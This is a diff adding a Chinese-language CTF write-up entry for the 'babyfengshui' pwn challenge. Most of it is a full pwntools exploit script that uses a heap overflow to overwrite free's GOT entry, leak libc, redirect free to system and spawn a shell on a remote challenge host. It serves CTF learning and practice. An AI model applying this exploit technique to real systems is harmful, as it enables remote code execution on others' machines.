@@ -1724,3 +1724,90 @@ if __name__== "__main__":
     io.sendline('1')
     io.interactive()
 ```
+
+
+### 19. babyfengshui
+题目：暂无
+
+思路：简单的堆溢出，通过堆溢出修改got表获取flag。
+
+主要存在的坑还是计算libc基址，直接使用libc.so计算出来的system地址无法使用，最后还是使用LibcSearcher可以计算出正确的system地址。全部源代码如下：
+```python
+from pwn import *
+from LibcSearcher import *
+
+elf = ELF('babyfengshui')
+libc = ELF('libc.so.6')
+
+debug = False
+if debug:
+    io = process('babyfengshui')
+else:
+    io = remote('220.249.52.134', 37716)
+
+def add(name, size):
+    io.sendlineafter('Action: ', '0')
+    io.sendlineafter(': ', '%d' % size)
+    io.sendlineafter(': ', name)
+    io.sendlineafter(': ', '2')
+    io.sendlineafter(': ', 'a')
+
+def delete(index):
+    io.sendlineafter('Action: ', '1')
+    io.sendlineafter(': ', '%d' % index)
+
+def display(index):
+    io.sendlineafter('Action: ', '2')
+    io.sendlineafter(': ', '%d' % index)
+    data = io.recvuntil('0: ')
+    return data
+
+def update(index, desc):
+    io.sendlineafter('Action: ', '3')
+    io.sendlineafter(': ', '%d' % index)
+    io.sendlineafter(': ', '%d' % len(desc))
+    io.send(desc)
+
+if __name__ == '__main__':
+    # chunk0:0x88, chunk1:0x88, chunk2:0x88, chunk3:0x88
+    add('0', 0x80)
+    add('1', 0x80)
+
+    # chunk0 and chunk1 merge to chunk01:0x110
+    delete(0)
+
+    # desc: chunk01, user2: chunk4
+    add('2', 0x10c)
+
+    # /bin/sh
+    add('3', 0x10)
+    update(3, '/bin/sh\n')
+
+    # write user2->desc overflow to user1->desc to free got
+    desc = b'A' * (0x10c + 0x88 + 4) + p32(elf.got['free'])
+    update(2, desc)
+
+    # display user1 to leak free addr
+    data = display(1)
+    freeAddr = u32(data.split(b'description: ')[1][:4])
+    log.success('free address: 0x%0x' % freeAddr)
+
+    # calc system addr
+    libcbase = freeAddr - libc.sym['free']
+    systemAddr = libcbase + libc.sym['system']
+    log.success('system address: 0x%0x' % systemAddr)
+
+    # libc searcher
+    libc = LibcSearcher('free', freeAddr)
+    libcbase = freeAddr - libc.dump('free')
+    systemAddr = libcbase + libc.dump('system')
+    log.success('system address: 0x%0x' % systemAddr)
+
+    # write user1->desc(free got) to system addr
+    desc = p32(systemAddr)
+    update(1, desc)
+
+    # system('/bin/sh')
+    delete(3)
+    io.interactive()
+```
